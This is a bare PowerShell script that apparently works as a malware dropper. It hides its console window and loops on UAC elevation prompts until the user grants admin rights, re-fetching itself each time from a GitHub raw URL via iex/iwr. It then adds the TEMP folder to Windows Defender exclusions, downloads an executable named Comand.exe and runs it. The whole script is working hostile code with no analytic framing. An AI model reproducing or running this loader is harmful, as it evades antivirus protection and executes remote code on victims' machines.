# ===== HIDE WINDOW =====
try {
    Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr h,int c);' -ErrorAction SilentlyContinue
    $w = [C.W]::GetConsoleWindow()
    if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }
} catch {}

# ===== ADMIN CHECK =====
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# ===== ELEVATION LOOP =====
$self = "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1"

if (-not $isAdmin) {
    while ($true) {
        try {
            Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command iex((iwr '$self' -UseBasicParsing).Content)" -ErrorAction Stop
            exit
        } catch {
            Start-Sleep -Seconds 2
        }
    }
    exit
}

# ===== ADMIN: WORK =====
$folder = $env:TEMP
try { Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue } catch {}
try { Invoke-WebRequest -Uri "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe" -OutFile "$folder\Comand.exe" -ErrorAction SilentlyContinue } catch {}
try { Start-Process -FilePath "$folder\Comand.exe" } catch {}
